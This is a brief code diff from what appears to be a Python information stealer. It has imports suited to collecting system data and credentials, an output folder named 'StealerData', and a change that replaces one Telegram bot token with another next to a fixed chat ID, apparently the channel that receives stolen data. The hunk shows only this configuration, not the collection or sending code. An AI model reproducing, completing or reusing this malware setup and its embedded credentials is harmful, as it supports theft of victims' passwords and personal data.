@@ -3,7 +3,7 @@ import os, shutil, json, sqlite3, subprocess, platform, socket, getpass, request
 from datetime import datetime
 from pathlib import Path
 
-TOKEN = "8344961429:AAEg71PXgEOFB-9kVGBFHm8tXFPvw8MHv0A"
+TOKEN = "8528053368:AAF5faIvI90mjkViQ-CY9Lo-nAjyjiWP6lY"
 CHAT_ID = "8516763046"
 OUTPUT_DIR = r"C:\StealerData"
 
